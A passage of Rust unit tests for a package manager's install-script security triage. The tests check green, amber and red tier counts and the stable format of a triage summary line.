                name,
                "1.0.0",
                &serde_json::json!({ "postinstall": script }),
            );
        }

        let installed = vec![
            ("green-pkg".to_string(), "1.0.0".to_string(), None),
            ("amber-pkg".to_string(), "1.0.0".to_string(), None),
            ("red-pkg".to_string(), "1.0.0".to_string(), None),
        ];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
        );

        assert_eq!(blocked.len(), 3);
        for bp in &blocked {
            assert!(
                bp.static_tier.is_some(),
                "freshly computed BlockedPackage MUST have Some(tier), \
                 got None for {}@{}",
                bp.name,
                bp.version,
            );
        }
    }

    // ── Phase 46 P2 Chunk 5 — count_blocked_by_tier + format_triage_summary_line ─

    fn tiered(name: &str, tier: lpm_security::triage::StaticTier) -> BlockedPackage {
        let mut b = make_blocked(name, "1.0.0", None, Some("sha256-x"));
        b.static_tier = Some(tier);
        b
    }

    #[test]
    fn count_blocked_by_tier_empty_returns_zeros() {
        let blocked: Vec<BlockedPackage> = Vec::new();
        assert_eq!(count_blocked_by_tier(&blocked), (0, 0, 0));
    }

    #[test]
    fn count_blocked_by_tier_counts_green_amber_red_distinctly() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            tiered("a", StaticTier::Green),
            tiered("b", StaticTier::Green),
            tiered("c", StaticTier::Amber),
            tiered("d", StaticTier::Red),
        ];
        assert_eq!(count_blocked_by_tier(&blocked), (2, 1, 1));
    }

    #[test]
    fn count_blocked_by_tier_amber_llm_counts_as_amber() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            tiered("a", StaticTier::Amber),
            tiered("b", StaticTier::AmberLlm),
        ];
        assert_eq!(
            count_blocked_by_tier(&blocked),
            (0, 2, 0),
            "AmberLlm must count as amber for display — indistinguishable \
             to the user's 'needs review' mental model"
        );
    }

    #[test]
    fn count_blocked_by_tier_none_counts_as_amber_conservative() {
        // Pre-P2 persisted state (static_tier = None) should count as
        // amber so the user sees it in the "needs review" bucket
        // rather than being silently hidden.
        let blocked = vec![make_blocked("pre-p2", "1.0.0", None, Some("sha256-x"))];
        assert!(blocked[0].static_tier.is_none());
        assert_eq!(count_blocked_by_tier(&blocked), (0, 1, 0));
    }

    #[test]
    fn format_triage_summary_line_shape_is_stable() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            tiered("green-a", StaticTier::Green),
            tiered("green-b", StaticTier::Green),
            tiered("amber-a", StaticTier::Amber),
            tiered("red-a", StaticTier::Red),
        ];
        // Snapshot — the anchor prefix and suffix are P2-stable
        // agent-parseable contracts. Changing them is a breaking
        // output change for any CI script that greps this line.
        assert_eq!(
            format_triage_summary_line(&blocked),
            "script-policy: triage (2 green / 1 amber / 1 red → lpm approve-builds)"
        );
    }

    #[test]
    fn format_triage_summary_line_all_zero_when_empty() {
        assert_eq!(
            format_triage_summary_line(&[]),
            "script-policy: triage (0 green / 0 amber / 0 red → lpm approve-builds)"
        );
    }

    #[test]
    fn format_triage_summary_line_anchor_and_suffix_present() {
        use lpm_security::triage::StaticTier;
        // Defensive against accidental format drift — agents
        // substring-match on these two anchors.
        let line = format_triage_summary_line(&[tiered("x", StaticTier::Green)]);
        assert!(
            line.starts_with("script-policy: triage ("),
            "line must start with the stable anchor; got: {line}"
        );
        assert!(
            line.ends_with(" → lpm approve-builds)"),
            "line must end with the stable suffix; got: {line}"
        );
    }
}
